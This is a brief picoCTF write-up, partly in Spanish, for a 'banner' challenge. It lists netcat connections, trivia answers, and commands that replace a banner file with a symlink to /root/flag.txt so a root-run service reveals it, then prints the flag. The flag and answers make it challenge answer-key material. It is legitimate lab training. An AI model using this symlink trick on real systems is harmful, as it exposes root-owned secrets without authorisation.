
#### Description

Can you abuse the banner?
Additional details will be available after launching your challenge instance.


#### Hints
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing


#### Solucion
1. Ingresamos al primer puerto
```
tethys.picoctf.net 58884
```
Tenemos la contrasena 
2. Ingresamos al segundo puerto
```
nc tethys.picoctf.net 50206
```

3. Contestamos las siguientes preguntas
```
What is the top cyber security conference in the world?
DEF CON

the first hacker ever was known for phreaking(making free phone calls), who was it?
john draper
```

3. ejecutar los siguientes comandos
```
cat banner
cat text
ls -la /root
rm home/player/banner
cat /root/script.py
rm /home/player/banner
ln -s /root/flag.txt /home/player/banner
```

4. le damos control C 
5. Volvemos a entrar al segundo puerto que abrimos anteriormente
```
nc tethys.picoctf.net 50206
```
y nos da la bandera
```
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
```